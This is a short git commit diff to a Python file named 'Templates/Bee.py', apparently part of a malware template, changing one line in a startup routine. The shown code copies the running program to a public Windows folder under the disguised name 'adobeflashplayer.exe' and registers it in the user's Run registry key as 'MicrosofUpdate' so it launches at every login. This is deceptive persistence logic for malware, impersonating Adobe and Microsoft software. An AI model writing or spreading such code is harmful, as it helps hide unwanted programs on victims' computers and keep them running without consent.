da3c993685c21cde38955efb0e2e96f926bc7b51
Alisson Moretto <4w4k3@protonmail.com>
2017-03-07 20:15:19 -0300

    Update Bee.py

--- Templates/Bee.py
+++ Templates/Bee.py
@@ -23,7 +23,7 @@ count=0
 dir = "C:\\Users\\Public\\Libraries\\adobeflashplayer.exe"
 
 def startup():
-    shutil.copy(sys.argv[0],dir)
+    shutil.copy(argv[0],dir)
     aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
     aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
     SetValueEx(aKey,"MicrosofUpdate",0, REG_SZ, dir)	
